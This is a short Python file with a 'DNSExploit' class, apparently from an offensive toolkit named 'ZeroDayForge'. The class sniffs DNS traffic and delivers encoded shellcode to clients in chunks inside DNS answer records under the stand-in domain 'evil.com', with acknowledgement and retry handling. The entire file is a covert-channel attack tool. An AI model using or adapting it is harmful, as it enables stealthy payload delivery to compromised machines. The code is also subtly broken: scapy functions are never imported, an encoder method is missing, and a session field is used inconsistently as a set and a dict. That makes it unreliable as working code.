import time
import random
import logging
from collections import defaultdict

class DNSExploit:
	def __init__(self):
		self.logger = logging.getLogger('ZeroDayForge.DNS')
		self.sessions = defaultdict(dict)
		
	def inject_via_dns(self, shellcode, domain="evil.com", max_retries=3):
		"""Reliable multi-stage DNS exfiltration"""
		encoded = self._dns_encoder(shellcode)
		chunks = [encoded[i:i+200] for i in range(0, len(encoded), 200)]
		
		def handler(pkt):
			if pkt.haslayer(DNSQR):
				client_id = pkt[IP].src
				session = self.sessions[client_id]
				
				# Handle chunk ACKs
				if b'ACK' in pkt[DNSQR].qname:
					chunk_id = int(pkt[DNSQR].qname.split(b'.')[0])
					session['acked'].add(chunk_id)
					return
				
				# Send new chunks with retry logic
				for i in range(len(chunks)):
					if i not in session.get('sent', set()):
						self._send_chunk(i, chunks[i], client_id, domain)
						session['sent'][i] = time.time()
						break
				
				# Retry logic
				for chunk_id, sent_time in list(session['sent'].items()):
					if time.time() - sent_time > 5:  # 5s timeout
						if session.get('retries', {}).get(chunk_id, 0) < max_retries:
							self._send_chunk(chunk_id, chunks[chunk_id], client_id, domain)
							session['retries'][chunk_id] = session['retries'].get(chunk_id, 0) + 1
							self.logger.warning(f"Retrying chunk {chunk_id} for {client_id}")
				
		sniff(prn=handler, store=0)

	def _send_chunk(self, chunk_id, chunk, client, domain):
		self.logger.info(f"Sending chunk {chunk_id} to {client}")
		send(IP(dst=client)/UDP()/DNS(
			qd=DNSQR(qname=f"{chunk_id}.{domain}"),
			an=DNSRR(rrname=f"{chunk_id}.{domain}", rdata=chunk)
		))